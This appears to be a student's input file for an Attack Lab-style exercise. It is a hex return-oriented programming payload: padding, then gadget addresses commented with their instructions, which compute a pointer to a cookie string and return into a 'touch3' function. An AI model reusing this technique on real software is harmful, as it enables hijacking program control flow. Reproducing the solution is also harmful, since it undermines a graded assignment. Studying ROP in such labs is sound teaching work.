00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

58 19 40 00 00 00 00 00	/* mov %rsp, %rax */
fb 18 40 00 00 00 00 00 /* mov %rax, %rdi */
2c 19 40 00 00 00 00 00 /* popq %rax */
48 00 00 00 00 00 00 00	/* distance here to string */

51 19 40 00 00 00 00 00 /* movl %eax, %ecx */
43 19 40 00 00 00 00 00	/* movl %ecx, %edx */
74 19 40 00 00 00 00 00 /* movl %edx, %esi */
35 19 40 00 00 00 00 00 /* lea(%rdi,%rsi,1), %rax */
fb 18 40 00 00 00 00 00 /* mov %rax, %rdi */
66 18 40 00 00 00 00 00 /* return to touch3 */
32 37 36 61 64 65 65 37 /* string of cookie */

